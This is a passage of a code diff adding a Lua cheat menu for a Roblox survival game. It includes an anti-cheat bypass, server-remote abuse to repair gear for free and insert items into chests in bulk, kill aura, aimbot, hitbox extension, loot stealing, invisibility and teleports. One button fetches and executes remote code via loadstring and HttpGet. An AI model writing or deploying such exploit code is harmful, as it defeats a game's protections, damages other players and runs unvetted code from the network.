+                    ChrAddedFunc = nil
+                end
+                EspOnPlayer(plr)
+            end)
+        end
+    end
+end
+
+--Sections and ui stuff
+local MainSection = Main:CreateSection("Main")
+
+MainSection:CreateToggle({
+    Name = 'Remember Configs',
+    Default = false,
+    Flag = 'RememberConfigs',
+    Callback = function(Value)
+        return Value
+    end
+})
+
+MainSection:CreateButton({
+    Name = 'AC Bypass',
+    Callback = function()
+        if not IsPlayerAlive(LocalPlayer) then
+            MakeAtlasNotification('Not alive', 'Maybe click the play button?', 5)
+            return
+        end
+        if IsPlayerAlive(LocalPlayer) then
+            local oldpos = LocalPlayer.Character.HumanoidRootPart.CFrame
+            local myroot = LocalPlayer.Character.HumanoidRootPart
+			for i=1, 100 do
+				myroot.CFrame = CFrame.new(7562, 221, 18946)
+            	RemoteEvents['Sonar']:FireServer()
+            	myroot.CFrame = oldpos
+			end
+            message.New('Positive', 'Bypassed AntiCheat')
+        end
+    end
+})
+
+MainSection:CreateInteractable({
+    Name = 'Infinite Yield',
+    ActionText = 'Execute',
+    Callback = function()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source', true))()
+    end
+})
+
+MainSection:CreateKeybind({
+    Name = 'AutoPickup',
+    Default = "X",
+	Flag = 'AutoPickup',
+	KeyPressed = AutoPickup,
+})
+
+MainSection:CreateToggle({
+    Name = 'AutoPickup(toggle)',
+	Default = false,
+	Flag = 'AutoPickup(toggle)',
+    Callback = function(Value)
+        getgenv().configs.AutoPickup2 = Value
+        AutoPickup2() 
+    end
+})
+
+MainSection:CreateButton({
+    Name = 'Steal any op loot on ground',
+    Callback = function(Value)
+        local function FindFunnyClosestItem()
+            local closest
+            local range = math.huge
+            for _, funnyitem in pairs(Workspace:GetDescendants()) do
+				if funnyitem:IsA("Model") then
+					if string.find(funnyitem.Name:lower(), 'obsidian') or string.find(funnyitem.Name:lower(), 'staff') or string.find(funnyitem.Name:lower(), 'moonstone') or string.find(funnyitem.Name:lower(), 'lunar') or string.find(funnyitem.Name:lower(), 'zenyte') or string.find(funnyitem.Name:lower(), 'obsidian') or string.find(funnyitem.Name:lower(), 'diamond') or string.find(funnyitem.Name:lower(), 'obsidian') or string.find(funnyitem.Name:lower(), 'lucky') or string.find(funnyitem.Name:lower(), 'pumpkin') or string.find(funnyitem.Name:lower(), 'book') or string.find(funnyitem.Name:lower(), 'volcanic ore') then
+						if not funnyitem:FindFirstChildOfClass('StringValue') and not funnyitem.Parent:FindFirstChildOfClass('Humanoid') and not string.find(funnyitem.Name:lower(), 'harvest') and not string.find(funnyitem.Name:lower(), 'wizard') and not string.find(funnyitem.Name:lower(), 'zenytes') and not string.find(funnyitem.Parent.Name:lower(), 'anvil') and not string.find(funnyitem.Name:lower(), 'pet') and not string.find(funnyitem.Name:lower(), 'cave') and not string.find(funnyitem.Name:lower(), 'rock') and not string.find(funnyitem.Name:lower(), 'stone') then
+							if IsPlayerAlive(LocalPlayer) then
+								local dist = (LocalPlayer.Character.HumanoidRootPart.Position - funnyitem:GetPivot().Position).magnitude
+								if dist < range then
+									range = dist
+									closest = funnyitem
+								end
+							end
+						end
+					end
+				end
+            end
+            return closest
+        end
+        if FindFunnyClosestItem() then
+            local oldpos = LocalPlayer.Character.HumanoidRootPart.CFrame
+            LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(FindFunnyClosestItem():GetPivot().Position)
+            task.wait(0.2)
+            AutoPickup()
+            LocalPlayer.Character.HumanoidRootPart.CFrame = oldpos
+        else
+            MakeAtlasNotification('wah wah wahhh', 'noting good on da floor :(', 3)
+        end
+    end
+})
+
+local InstantRepairSection = Main:CreateSection('Instant repair free, click as many times as needed')
+
+InstantRepairSection:CreateDropdown({
+    Name = 'Instant Repair',
+    DefaultItemSelected = '...',
+    Options = {'MoonstoneSet', 'ObsidianSet', 'AllShields', 'AllSwords', 'AllBows', 'AllBooks', 'AllStaffs'},
+    Callback = function(Value)
+        local ClosestChest = GetClosestChest()
+        if not ClosestChest then
+            MakeAtlasNotification('Needs chest', 'Place any chest down!', 2.5)
+            return
+        end
+        local set
+
+        if Value == 'MoonstoneSet' then
+            set = MoonstoneSet
+        elseif Value == 'ObsidianSet' then
+            set = ObsidianSet
+        elseif Value == 'AllShields' then
+            set = AllShields
+        elseif Value == 'AllSwords' then
+            set = AllSwords
+        elseif Value == 'AllBows' then
+            set = AllBows
+        elseif Value == 'AllBooks' then
+            set = AllBooks
+        elseif Value == 'AllStaffs' then
+            set = AllStaffs
+        end
+        
+        for _, piece in pairs(set) do
+            RemoteEvents['UpdateStorageChest']:FireServer(ClosestChest, true, piece)
+            RemoteEvents['UpdateStorageChest']:FireServer(ClosestChest, false, piece)
+        end
+        MakeAtlasNotification('Repaired', 'Repaired '..Value, 1)
+    end
+})
+
+local AnythingInChestSection = Main:CreateSection('Place Anything in(nearest) chest')
+
+AnythingInChestSection:CreateDropdown({
+    Name = 'Specific Chest Type',
+    DefaultItemSelected = 'Any',
+    Options = {'Any', 'Wood', 'Stone', 'Silver', 'Gold', 'Ruby', 'Diamond', 'Zenyte', 'Obsidian', 'Moonstone'},
+    ItemSelecting = true,
+    Callback = function(Value)
+        getgenv().configs.ChestType = Value 
+    end
+})
+
+AnythingInChestSection:CreateButton({
+    Name = 'Store Item',
+    Callback = function()
+        local function GetClosestFilteredChest()
+            local CheckPassiveOrNonPassive = Workspace:FindFirstChild("Replicators"):FindFirstChild('NonPassive') and 'NonPassive' or 'Passive'
+	        local closest
+	        local range = math.huge
+            if IsPlayerAlive(LocalPlayer) then
+                for _, chest in pairs(Workspace:WaitForChild("Replicators")[CheckPassiveOrNonPassive]:GetChildren()) do
+                    if string.find(chest.Name:lower(), 'storage') and chest:FindFirstChildOfClass('MeshPart') then
+                        if getgenv().configs.ChestType == 'Any' then
+                            local dist = (LocalPlayer.Character:WaitForChild('HumanoidRootPart').Position - chest:FindFirstChildOfClass('MeshPart').Position).magnitude
+                            if dist < range then
+                                range = dist
+                                closest = chest
+                            end
+                        else
+                            if string.find(chest.Name:lower(), getgenv().configs.ChestType:lower()) then
+                                local dist = (LocalPlayer.Character:WaitForChild('HumanoidRootPart').Position - chest:FindFirstChildOfClass('MeshPart').Position).magnitude
+                                if dist < range then
+                                    range = dist
+                                    closest = chest
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+	        return closest
+        end
+        local GetFilteredChest = GetClosestFilteredChest()
+        if not GetFilteredChest then
+            MakeAtlasNotification('Needs chest', 'Place any chest down!', 2.5)
+            return
+        end
+        for i=1, getgenv().AmountOfChestInserts do
+            RemoteEvents['UpdateStorageChest']:FireServer(GetFilteredChest, true, SWITCHEDITEMSTABLE[getgenv().ItemToPutInChest])
+        end
+    end
+})
+
+getgenv().ChestItems = AnythingInChestSection:CreateDropdown({
+    Name = 'Inventory Item',
+    DefaultItemSelected = '...',
+    Options = {'...'},
+    ItemSelecting = true,
+    Callback = function(Value)
+        getgenv().ItemToPutInChest = Value 
+    end
+})
+
+local ItemsToPutInChest = {};
+
+for _, inv in pairs(MyInventory:GetChildren()) do
+    if inv:IsA("ImageLabel") and inv.Name ~= 'Arrow' then
+        table.insert(ItemsToPutInChest, inv.Name)
+    end
+end
+
+table.sort(ItemsToPutInChest)
+
+getgenv().ChestItems:Update(ItemsToPutInChest)
+
+if not getgenv().InventoryCollecting then
+    getgenv().InventoryCollecting = MyInventory.ChildAdded:Connect(function(item)
+        ItemsToPutInChest = {}
+		for _, inv in pairs(MyInventory:GetChildren()) do
+			if inv:IsA("ImageLabel") and inv.Name ~= 'Arrow' then
+				table.insert(ItemsToPutInChest, inv.Name)
+			end
+		end
+        table.sort(ItemsToPutInChest)
+        getgenv().ChestItems:Update(ItemsToPutInChest)
+    end)
+end
+
+AnythingInChestSection:CreateSlider({
+    Name = 'Amount of item',
+    Min = 1,
+	Max = 200,
+	Default = 1,
+	Digits = 0,
+	Flag = 'AmountChestItem',
+	Callback = function(Value)
+		getgenv().AmountOfChestInserts = Value
+	end 
+})
+
+local AutoEatSection = Main:CreateSection('Auto Eat')
+
+AutoEatSection:CreateToggle({
+    Name = 'Auto Eat(Greatest food source)',
+    Default = false,
+	Flag = 'AutoEat',
+    Callback = function(Value)
+        getgenv().configs.AutoEat = Value
+        AutoEat()
+    end
+})
+AutoEatSection:CreateDropdown({
+    Name = 'Auto Eat Type',
+    DefaultItemSelected = 'AFK',
+    Options = {'AFK', 'War'},
+    ItemSelecting = true,
+    Callback = function(Value)
+        getgenv().configs.EatingType = Value
+    end
+})
+
+local MiscSection = Main:CreateSection('Misc')
+
+MiscSection:CreateToggle({
+    Name = 'Ctrl+Click tp',
+    Default = false,
+	Flag = 'CtrlTp',
+    Callback = function(Value)
+        getgenv().configs.ClickTp = Value
+        ClickTp()
+    end
+})
+
+MiscSection:CreateToggle({
+    Name = 'Mine Aura',
+    Default = false,
+	Flag = 'MineAura',
+    Callback = function(Value)
+        getgenv().configs.MineAura = Value
+        MineAura()
+    end
+})
+
+MiscSection:CreateButton({
+    Name = 'Go invisible(Player noclips)',
+    Callback = function()
+        if IsPlayerAlive(LocalPlayer) then
+            local oldpos = LocalPlayer.Character.HumanoidRootPart.Position
+            LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(7195, 98, 18663)
+            for _, descendant in pairs(LocalPlayer.Character:GetDescendants()) do
+                if descendant:IsA("Motor6D") or descendant.Name == 'PlayerBillboard' then
+                    descendant:Destroy()
+                end
+            end
+            task.wait(1)
+            if LocalPlayer.Character:FindFirstChild('Hitbox') then
+                LocalPlayer.Character.Hitbox:Destroy()
+            end
+            LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(oldpos)
+        end
+    end
+})
+
+MiscSection:CreateButton({
+    Name = 'Go Visible(Resets character)',
+    Callback = function()
+        if IsPlayerAlive(LocalPlayer) then
+            local Respawn
+            local oldpos = LocalPlayer.Character.HumanoidRootPart.Position
+            LocalPlayer.Character.Humanoid.Health = 0
+            Respawn = LocalPlayer.CharacterAdded:Connect(function(chr)
+                chr:WaitForChild('HumanoidRootPart').CFrame = CFrame.new(oldpos)
+                Respawn:Disconnect()
+                return
+            end)
+        end
+    end
+})
+
+MiscSection:CreateButton({
+    Name = 'Render Map(Helpful for loading assets)',
+    Callback = function()
+        if IsPlayerAlive(LocalPlayer) then
+            local oldpos = LocalPlayer.Character:WaitForChild('HumanoidRootPart').CFrame
+            local function MakeTween(pos)
+                return TweenService:Create(LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(1.5, Enum.EasingStyle.Quad), {CFrame = CFrame.new(pos)})
+            end
+            local a = MakeTween(Vector3.new(-1812, 46, -7685))
+            a:Play()
+            a.Completed:Wait()
+            local b = MakeTween(Vector3.new(-1838, 46, -3189))
+            b:Play()
+            b.Completed:Wait()
+            local c =  MakeTween(Vector3.new(5825, 76, -3258))
+            c:Play()
+            c.Completed:Wait()
+            local d =  MakeTween(Vector3.new(5330, 36, -7372))
+            d:Play()
+            d.Completed:Wait()
+            local e =  MakeTween(Vector3.new(4782, 74, -5208))
+            e:Play()
+            e.Completed:Wait()
+            local f =  MakeTween(Vector3.new(-152, 106, -4079))
+            f:Play()
+            f.Completed:Wait()
+            LocalPlayer.Character:WaitForChild('HumanoidRootPart').CFrame = oldpos
+        end
+    end
+})
+
+MiscSection:CreateToggle({
+    Name = 'Other Hacker Detector',
+    Default = false,
+	Flag = 'HackerDetector',
+    Callback = function(Value)
+        local function CheckTeleport(rootpart, initialpos)
+            task.wait(0.2)
+            if (rootpart.Position - initialpos).magnitude > 100 then
+                return true
+            end
+        end
+        local function CheaterDetector()
+            _G.cooldown = 0
+            local abs = math.abs
+            local Reason = 'Unknown'
+            while getgenv().configs.CheaterDetector do
+                if getgenv().configs.CheaterDetector then
+                    task.wait(_G.cooldown)
+                    for _, plr in pairs(Players:GetPlayers()) do
+                        if plr ~= LocalPlayer then
+                            if IsPlayerAlive(plr) then
+                                local oldpos = plr.Character.HumanoidRootPart.Position
+                                local velocity = plr.Character.HumanoidRootPart.AssemblyLinearVelocity
+                                local maxvelocity = {abs(velocity.X), abs(velocity.Y), abs(velocity.Z)}
+                                local max = math.max(unpack(maxvelocity))
+                                task.spawn(function()
+                                    if CheckTeleport(plr.Character.HumanoidRootPart, plr.Character.HumanoidRootPart.Position) then
+                                        Reason = 'Teleporting'
+                                        MakeAtlasNotification('Suspicious Activity', plr.Name..' is looking suspicious, Reason: '..Reason, 3)
+                                    end
+                                    _G.cooldown = 0.5
+                                end)
+                                if plr.Character.Humanoid:GetState() == Enum.HumanoidStateType.PlatformStanding then
+                                    Reason = 'Flying'
+                                    MakeAtlasNotification('Suspicious Activity', plr.Name..' is looking suspicious, Reason: '..Reason, 3)
+                                    _G.cooldown = 3
+                                elseif plr.Character.Humanoid:GetState() == Enum.HumanoidStateType.Seated and max > 60 then
+                                    Reason = 'Vehicle Fly/Speed'
+                                    MakeAtlasNotification('Suspicious Activity', plr.Name..' is looking suspicious, Reason: '..Reason, 3)
+                                    _G.cooldown = 1
+                                elseif max > 80 and max ~= maxvelocity[2] then
+                                    Reason = 'Excessive Speed'
+                                    MakeAtlasNotification('Suspicious Activity', plr.Name..' is looking suspicious, Reason: '..Reason, 3)
+                                    _G.cooldown = 1
+                                elseif plr.Character.Humanoid.WalkSpeed > 24 then
+                                    Reason = 'Speed'
+                                    MakeAtlasNotification('Suspicious Activity', plr.Name..' is looking suspicious, Reason: '..Reason, 3)
+                                    _G.cooldown = 1
+                                elseif plr.Character.Humanoid.JumpPower > 80 then
+                                    Reason = 'Jump Power'
+                                    MakeAtlasNotification('Suspicious Activity', plr.Name..' is looking suspicious, Reason: '..Reason, 3)
+                                    _G.cooldown = 1
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+        end
+        getgenv().configs.CheaterDetector = Value
+        CheaterDetector()
+    end
+})
+
+local BumpUpMainSection = Main:CreateSection('')
+
+local KillAuraSection = Combat:CreateSection('Kill Aura')
+
+KillAuraSection:CreateToggle({
+    Name = 'Kill Aura',
+    Default = false,
+    Flag = 'KillAura',
+    Callback = function(Value)
+        getgenv().configs.KillAura = Value
+        KillAura()
+    end
+})
+
+KillAuraSection:CreateTextBox({
+    Name = 'Whitelist Person',
+    DefaultText = '',
+    PlaceholderText = 'Username here',
+    ClearTextOnFocus = true,
+    Flag = 'WhitelistPersonTextbox',
+    Callback = function(args)
+        if args == "" then return end
+        for _, plr in pairs(Players:GetPlayers()) do
+            if string.find(plr.Name:lower(), args:lower()) or string.find(plr.DisplayName:lower(), args:lower()) then
+                table.insert(Whitelist_table, plr.Name)
+                MakeAtlasNotification("Player added to whitelist", plr.Name .. ' was added to the whitelist table', 3)
+                return
+            end
+        end
+    end
+})
+
+KillAuraSection:CreateTextBox({
+    Name = 'Remove Whitelisted Person',
+    DefaultText = '',
+    PlaceholderText = 'Username here',
+    ClearTextOnFocus = true,
+    Flag = 'BlacklistPersonTextbox',
+    Callback = function(args)
+        if args == "" then return end
+        for _, plr in pairs(Players:GetPlayers()) do
+            if string.find(plr.Name:lower(), args:lower()) or string.find(plr.DisplayName:lower(), args:lower()) then
+                if table.find(Whitelist_table, plr.Name) then
+                    table.remove(Whitelist_table, table.find(Whitelist_table, plr.Name))
+                    MakeAtlasNotification("Player removed from whitelist", plr.Name .. ' was removed from the whitelist', 3)
+                    return
+                end
+            end
+        end
+    end
+})
+
+local CloseCombatSection = Combat:CreateSection('Close Combat')
+
+CloseCombatSection:CreateToggle({
+    Name = 'Player Lock(Aimbot)',
+    Default = false,
+    Flag = 'PlayerLock',
+    Callback = function(Value)
+        getgenv().configs.PlayerLock = Value
+        PlayerLock()
+    end
+})
+
+CloseCombatSection:CreateToggle({
+    Name = 'Auto Heal(Pumpkins)',
+    Default = false,
+    Flag = 'AutoHeal',
+    Callback = function(Value)
+        getgenv().configs.Pumpkins = Value
+        Pumpkins()
+    end
+})
+
+CloseCombatSection:CreateToggle({
+    Name = 'Hitbox Extender',
+    Default = false,
+    Flag = 'HitboxExtender',
+    Callback = function(Value)
+        getgenv().configs.Hitbox = Value
+        Hitbox()
+        if not getgenv().configs.Hitbox then
+            for _, plr in pairs(Players:GetPlayers()) do
+                if plr ~= LocalPlayer and IsPlayerAlive(plr) and plr.Character:FindFirstChild('Hitbox') then
+                    plr.Character.Hitbox.Size = Vector3.new(4.9453125, 6.273651123046875, 2.0283203125)
+                end
+            end
+        end
+    end
+})
+
+CloseCombatSection:CreateSliderToggle({
+	Name = "EscapeDeath(Slider = Time)",
+	Min = 5,
+	Max = 30,
+    SliderDefault = 15,
+	Digits = 0,
+	ToggleDefault = false,
+    SliderFlag = "EscapeDeathSlider",
+	ToggleFlag = "EscapeDeathToggle",
+	SliderCallback = function(Value) 
+		TimeBetweenTps = Value
+	end,
+	ToggleCallback = function(Value)  
+		getgenv().configs.SafeDeath = Value
+        SafeDeath()
+	end
+})
+
+local AdvancedKillAuraSection = Combat:CreateSection('Advanced Kill Aura')
+
+
+AdvancedKillAuraSection:CreateTextBox({
+    Name = 'Op KillAura Target',
+    DefaultText = '',
+    PlaceholderText = 'Username here',
+    ClearTextOnFocus = true,
+    Flag = 'OpKillAuraTarget',
+    Callback = function(Value)
+        if Value == "" then return end
+        for _, plr in pairs(Players:GetPlayers()) do
+            if string.find(plr.Name:lower(), Value:lower()) or string.find(plr.DisplayName:lower(), Value:lower()) then
+                table.insert(OpKillAuraTable, 1, plr)
+                MakeAtlasNotification("Entered "..plr.Name, 'You are going to target ' ..plr.Name .. ' >:)', 3)
+                return
+            end
+        end
+    end
+})
+AdvancedKillAuraSection:CreateSliderToggle({
+	Name = "Op Kill Aura(Dont touch slider)",
+	Min = 1,
+	Max = 8,
+    SliderDefault = 3,
+	Digits = 0,
+	ToggleDefault = false,
+    SliderFlag = "PredictionDistance",
+	ToggleFlag = "OPKillAura",
+	SliderCallback = function(Value) 
+		getgenv().PredictAmount = Value
+	end,
+	ToggleCallback = function(Value)  
+		getgenv().configs.OpKillAura = Value
+        OpKillAura()
+	end
+})
+
+AdvancedKillAuraSection:CreateToggle({
+    Name = 'Toggle Predict',
+    Default = false,
+    Flag = 'TogglePredict',
+    Callback = function(Value)
+        getgenv().configs.PredictOpKillAura = Value
+    end
+})
+
+local CombatMiscsSection = Combat:CreateSection('Miscs')
+
+CombatMiscsSection:CreateToggle({
+    Name = 'Mob Aura',
+    Default = false,
+    Flag = 'MobAura',
+    Callback = function(Value)
+        getgenv().configs.MobAura = Value
+        MobAura()
+    end
+})
+
+CombatMiscsSection:CreateKeybind({
+    Name = 'Trap Player',
+    Default = 'Minus',
+    Flag = 'TrapPlayer',
+    KeyPressed = TrapPlayer
+})
+
+CombatMiscsSection:CreateDropdown({
+    Name = 'Trap Type',
+    DefaultItemSelected = 'Stone Trap',
+    Options = {'Stone Trap', 'Ruby Trap', 'Zenyte Trap'},
+    ItemSelecting = true,
+    Callback = function(Value)
+       getgenv().configs.TrapType = Value 
+    end
+})
+
+local TreeFarmSection = Farming:CreateSection('Tree Farm')
+
+TreeFarmSection:CreateToggle({
+	Name = 'Conifer Farm(equip any tool)',
+	Default = false,
+    Flag = 'ConiferFarm',
+	Callback = function(Value)
+		getgenv().configs.ConfierFarm = Value
+		ConiferFarm()
+	end
+})
+
+local BossFarmSettingSection = Farming:CreateSection('Boss Farm Settings')
+
+BossFarmSettingSection:CreateToggle({
+    Name = 'Auto repair Ob Club(50%)(place chest)',
+    Default = false,
+    Flag = 'AutoRepairClub',
+    Callback = function(Value)
+        getgenv().configs.AutoRepairClub = Value
+       AutoRepairClub()
+    end
+})
+
+BossFarmSettingSection:CreateToggle({
+    Name = 'Use Soul Keys to farm bosses(inf farm)',
+    Default = false,
+    Flag = 'SoulKeyBossFarm',
+    Callback = function(Value)
+        getgenv().configs.UseSoulKeys = Value
+    end
+})
+
+local BossFarmsSection = Farming:CreateSection('Boss Farms(Disables kill aura)')
+
+BossFarmsSection:CreateToggle({
+    Name = 'Obsidian Boss Farm',
+    Default = false,
+    Flag = 'ObsidianBossFarm',
+    Callback = function(Value)
+        getgenv().configs.ObsidianBoss = Value
+       ObsidianBoss()
+    end
+})
+
+BossFarmsSection:CreateToggle({
+    Name = 'Zenyte/Lucky Boss Farm',
+    Default = false,
+    Flag = 'Zenyte/LuckyBoss Farm',
+    Callback = function(Value)
+        getgenv().configs.ZenLuckBoss = Value
+       ZenLuckBoss()
+    end
+})
+
+BossFarmsSection:CreateToggle({
+    Name = 'Spirit Boss Aura',
+    Default = false,
+    Flag = 'SpiritBossFarm',
+    Callback = function(Value)
+        getgenv().configs.SpiritBoss = Value
+       SpiritBoss()
+    end
+})
+
+local NotAutoSection = Farming:CreateSection('NOT AUTO')
+
+NotAutoSection:CreateToggle({
+    Name = 'Lucky Slime Farm',
+    Default = false,
+    Flag = 'LuckySlimeFarm',
+    Callback = function(Value)
+        getgenv().configs.LuckySlime = Value
+       LuckySlime()
+    end
+})
+
+NotAutoSection:CreateToggle({
+    Name = 'Evil Skeleton Farm',
+    Default = false,
+    Flag = 'EvilSkeletonFarm',
+    Callback = function(Value)
+        getgenv().configs.EvilSkeleton = Value
+        EvilSkeleton()
+    end
+})
+
+NotAutoSection:CreateToggle({
+    Name = 'Ogre Farm',
+    Default = false,
+    Flag = 'OgreFarm',
+    Callback = function(Value)
+        getgenv().configs.Ogre = Value
+       Ogre()
+    end
+})
+
+NotAutoSection:CreateToggle({
+    Name = 'Captain Squid Farm',
+    Default = false,
+    Flag = 'CaptainSquidFarm',
+    Callback = function(Value)
+        getgenv().configs.Squid = Value
+        Squid()
+    end
+})
+
+local BumpUpFarmSection = Farming:CreateSection('')
+
+local EventsSection = Teleports:CreateSection('Events')
+
+EventsSection:CreateButton({
+    Name = 'Asteroid',
+    Callback = function()
+        if IsPlayerAlive(LocalPlayer) then
+            if Workspace:FindFirstChild('Asteroid', true) then
+                local AstPos = Workspace:FindFirstChild('Asteroid', true):GetPivot().Position
+                local myroot = LocalPlayer.Character.HumanoidRootPart
+                myroot.CFrame = CFrame.new(AstPos + Vector3.new(0, 35, 0))
+            else
+                MakeAtlasNotification('No Asteroids gangy', 'A sad sad day... I know :(', 3)
+            end
+        end
+    end
+})
+
+EventsSection:CreateButton({
+    Name = 'Lucky Slime',
+    Callback = function()
+        if IsPlayerAlive(LocalPlayer) then
+            if Workspace:WaitForChild('Replicators'):FindFirstChild('Both'):FindFirstChild("Lucky Slime") then
+                local slime = Workspace.Replicators.Both["Lucky Slime"]
+                if slime:FindFirstChild('Humanoid') and slime:FindFirstChild('HumanoidRootPart') then
+                    local slimepos = slime.HumanoidRootPart.Position
+                    local myroot = LocalPlayer.Character.HumanoidRootPart
+                    myroot.CFrame = CFrame.new(slimpos + Vector3.new(15, 0, 0))
+                end
+            else
+                MakeAtlasNotification('No Lucky Slime gangy', 'A sad sad day... I know :(', 3)
+            end
+        end
+    end
+})
+
+EventsSection:CreateButton({
+    Name = 'Mega Candy Rock',
+    Callback = function()
+        if IsPlayerAlive(LocalPlayer) then
+            local myroot = LocalPlayer.Character.HumanoidRootPart
+            myroot.CFrame = CFrame.new(1944.84009, -6.88914394, -3933.60352, -0.775113165, 2.15758467e-10, 0.631822467, 5.72924108e-09, 1, 6.68708688e-09, -0.631822467, 8.80311202e-09, -0.775113165)
+        end
+    end
+})
+
+local TradersSection = Teleports:CreateSection('Traders')
+
+TradersSection:CreateButton({
+    Name = 'Resource Trader',
+    Callback = function()
+        if IsPlayerAlive(LocalPlayer) then
+            local myroot = LocalPlayer.Character.HumanoidRootPart
+            myroot.CFrame = CFrame.new(4288, 43, -4014)
+        end
+    end
+})
+
+TradersSection:CreateButton({
+    Name = 'Armor/Weapon Trader',
+    Callback = function()
+        if IsPlayerAlive(LocalPlayer) then
+            local myroot = LocalPlayer.Character.HumanoidRootPart
+            myroot.CFrame = CFrame.new(427, 12, -3451)
+        end
+    end
+})
+
+TradersSection:CreateButton({
+    Name = 'Ocean Trader',
+    Callback = function()
+        if IsPlayerAlive(LocalPlayer) then
+            local myroot = LocalPlayer.Character.HumanoidRootPart
+            myroot.CFrame = CFrame.new(1673, -290, -5659)
+        end
+    end
+})
+
+local VolcanoSection = Teleports:CreateSection('Volcano')
+
+VolcanoSection:CreateButton({
+    Name = 'Volcano',
+    Callback = function()
+        if IsPlayerAlive(LocalPlayer) then
+            local myroot = LocalPlayer.Character.HumanoidRootPart
+            myroot.CFrame = CFrame.new(-842, 63, -3603)
+        end
+    end
+})
+
+VolcanoSection:CreateButton({
+    Name = 'Volanic Furnace',
+    Callback = function()
+        if IsPlayerAlive(LocalPlayer) then
+            local myroot = LocalPlayer.Character.HumanoidRootPart
+            myroot.CFrame = CFrame.new(2614, -454, -5579)
+        end
+    end
+})
+
+local CavesSection = Teleports:CreateSection('Caves')
+
+CavesSection:CreateButton({
+    Name = 'Zenyte Boss',
+    Callback = function()
+        if IsPlayerAlive(LocalPlayer) then
+            local myroot = LocalPlayer.Character.HumanoidRootPart
+            myroot.CFrame = CFrame.new(1741, -440, -4536)
+        end
+    end
+})
+
+CavesSection:CreateButton({
+    Name = 'Spirit Boss',
+    Callback = function()
+        if IsPlayerAlive(LocalPlayer) then
+            local myroot = LocalPlayer.Character.HumanoidRootPart
+            myroot.CFrame = CFrame.new(1427, -293, -4959)
+        end
+    end
+})
+
+CavesSection:CreateButton({
+    Name = 'Caves level 3',
+    Callback = function()
+        if IsPlayerAlive(LocalPlayer) then
+            local myroot = LocalPlayer.Character.HumanoidRootPart
+            myroot.CFrame = CFrame.new(1581, -502, -4649)
+        end
+    end
+})
+
+CavesSection:CreateButton({
+    Name = 'Caves level 2',
+    Callback = function()
+        if IsPlayerAlive(LocalPlayer) then
+            local myroot = LocalPlayer.Character.HumanoidRootPart
+            myroot.CFrame = CFrame.new(1559, -347, -4635)
+        end
+    end
+})
+
+CavesSection:CreateButton({
+    Name = 'Central Caves',
+    Callback = function()
+        if IsPlayerAlive(LocalPlayer) then
+            local myroot = LocalPlayer.Character.HumanoidRootPart
+            myroot.CFrame = CFrame.new(1532, -192, -4696)
+        end
+    end
+})
+
+local IslandSection = Teleports:CreateSection('Islands')
+
+IslandSection:CreateButton({
+    Name = 'Ice Biome',
+    Callback = function()
+        if IsPlayerAlive(LocalPlayer) then
+            local myroot = LocalPlayer.Character.HumanoidRootPart
+            myroot.CFrame = CFrame.new(1961, -2, -3973)
+        end
+    end
+})
+
+IslandSection:CreateButton({
+    Name = 'Pet Island',
+    Callback = function()
+        if IsPlayerAlive(LocalPlayer) then
+            local myroot = LocalPlayer.Character.HumanoidRootPart
+            myroot.CFrame = CFrame.new(2889, 54, -6465)
+        end
+    end
+})
+
+IslandSection:CreateButton({
+    Name = 'Banaenae Island',
+    Callback = function()
+        if IsPlayerAlive(LocalPlayer) then
+            local myroot = LocalPlayer.Character.HumanoidRootPart
+            myroot.CFrame = CFrame.new(3400, 13, -4467)
+        end
+    end
+})
+
+IslandSection:CreateButton({
+    Name = 'Magic Island',
+    Callback = function()
+        if IsPlayerAlive(LocalPlayer) then
+            local myroot = LocalPlayer.Character.HumanoidRootPart
+            myroot.CFrame = CFrame.new(1292, 125, -7234)
+        end
+    end
+})
+
+IslandSection:CreateButton({
+    Name = 'Starter Island',
+    Callback = function()
+        if IsPlayerAlive(LocalPlayer) then
+            local myroot = LocalPlayer.Character.HumanoidRootPart
+            myroot.CFrame = CFrame.new(-7507, 19, 7496)
+        end
+    end
+})
+
+IslandSection:CreateButton({
+    Name = 'Secret Island',
+    Callback = function()
+        if IsPlayerAlive(LocalPlayer) then
+            local myroot = LocalPlayer.Character.HumanoidRootPart
+            myroot.CFrame = CFrame.new(7139, 72, 18673)
+        end
+    end
+})
+
+local LeaderboardSection = Teleports:CreateSection('Leaderboard')
+
+LeaderboardSection:CreateButton({
+    Name = 'Leaderboard Place',
+    Callback = function()
+        if IsPlayerAlive(LocalPlayer) then
+            local myroot = LocalPlayer.Character.HumanoidRootPart
+            myroot.CFrame = CFrame.new(5313, 4, -5508)
+        end
+    end
+})
+
+local BumpUpTeleportSection = Teleports:CreateSection('')
+
+local OreFindingSection = OtherStuff:CreateSection('Ore Finding')
+
+OreFindingSection:CreateButton({
+    Name = 'Ore Finder',
+    Callback = function()
+        local OrePositionTable = {}
+        for _, ore in pairs(Workspace:GetDescendants()) do
+            if ore.Name == getgenv().OreType then
+                if ore:IsA('Model') and ore.PrimaryPart ~= nil then
+                    local orepos = ore.PrimaryPart.Position
+                    table.insert(OrePositionTable, orepos)
+                    break
+                end
+            end
+        end
+        if OrePositionTable[1] == nil then
+            MakeAtlasNotification("No "..getgenv().OreType.. ' Gangy', 'There is no '..getgenv().OreType.. ' :(', 3)
+        else
+            if IsPlayerAlive(LocalPlayer) then
+                local myroot = LocalPlayer.Character.HumanoidRootPart
+                myroot.CFrame = CFrame.new(OrePositionTable[1] + Vector3.new(0, 5, 0))
+            end
+        end
+    end
+})
+
+OreFindingSection:CreateDropdown({
+    Name = 'Ore Finder',
+    DefaultItemSelected = 'Rock',
+    Options = {'Lunar Rock', 'Volcanic Rock', 'Zenyte Rock', 'Diamond Rock', 'Gold Rock', 'Ruby Rock', 'Candy Rock', 'Silver Rock', 'Coal Rock', 'Rock'},
+    ItemSelecting = true,
+    Callback = function(Value)
+        getgenv().OreType = Value 
+    end
+})
+
+local MiscFindingSection = OtherStuff:CreateSection('Pathes, Shells, Slimes Finding')
+
+MiscFindingSection:CreateButton({
+    Name = 'Other Stuff Finder',
+    Callback = function()
+        local MiscPositionsTable = {}
+        for _, misc in pairs(Workspace:GetDescendants()) do
+            if misc.Name == getgenv().MiscItems then
+                if misc:IsA('Model') and misc.PrimaryPart ~= nil then
+                    local miscpos = misc.PrimaryPart.Position
